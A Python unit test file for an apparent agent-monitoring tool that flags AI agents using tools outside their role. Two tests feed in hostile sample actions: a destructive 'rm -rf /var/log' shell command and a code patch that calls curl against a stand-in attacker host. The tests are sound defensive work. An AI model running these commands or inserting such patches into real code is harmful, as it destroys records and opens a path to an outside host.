"""
Unit Tests for AgentShield-X Agent Genome Behavioral Fingerprinting & Biometrics.
Creator: Tharunkumar.S
"""

import pytest
from shield_core.agent_genome import AgentGenomeEngine, default_agent_genome


class TestAgentGenome:
    def test_default_seeded_genomes(self):
        engine = AgentGenomeEngine()
        genomes = engine.list_genomes()
        assert len(genomes) >= 3
        agent_ids = {g["agent_id"] for g in genomes}
        assert "agent-research" in agent_ids
        assert "agent-coding" in agent_ids
        assert "agent-sentinel" in agent_ids

    def test_benign_action_matches_genome(self):
        engine = AgentGenomeEngine()
        # Research agent calling a normal research tool
        res = engine.inspect_agent_action(
            agent_id="agent-research",
            tool_name="search_web",
            arguments={"query": "quantum computing breakthroughs 2026"},
            observed_latency_ms=32.0,
        )
        assert not res.is_anomaly
        assert res.drift_score < 0.35
        assert not res.identity_theft_detected
        assert res.processing_time_ms < 5.0  # sub-5ms latency

    def test_atypical_tool_triggers_anomaly(self):
        engine = AgentGenomeEngine()
        # Research agent suddenly executing shell commands
        res = engine.inspect_agent_action(
            agent_id="agent-research",
            tool_name="bash_exec",
            arguments={"command": "rm -rf /var/log"},
            observed_latency_ms=40.0,
        )
        assert res.is_anomaly
        assert res.drift_score >= 0.40
        assert any("Unprecedented tool" in a for a in res.anomalies_detected)

    def test_identity_theft_detection(self):
        engine = AgentGenomeEngine()
        # Research agent attempting to run "edit_file" (which belongs to the Coding Agent persona)
        res = engine.inspect_agent_action(
            agent_id="agent-research",
            tool_name="edit_file",
            arguments={"path": "src/main.py", "patch": "import os; os.system('curl attacker.site')"},
            observed_latency_ms=45.0,
        )
        assert res.is_anomaly
        assert res.identity_theft_detected
        assert res.suspected_impersonated_agent == "agent-coding"
        assert res.drift_score >= 0.80

    def test_sub_millisecond_fingerprint_generation(self):
        engine = AgentGenomeEngine()
        genome = engine.register_agent(
            agent_id="custom-agent",
            agent_name="Custom Financial Agent",
            role="Calculates options pricing and risk models",
            baseline_tools=["calc_black_scholes", "fetch_tickers", "compute_var"],
        )
        assert len(genome.dna_embedding) == 64
        assert genome.status == "CALIBRATED"

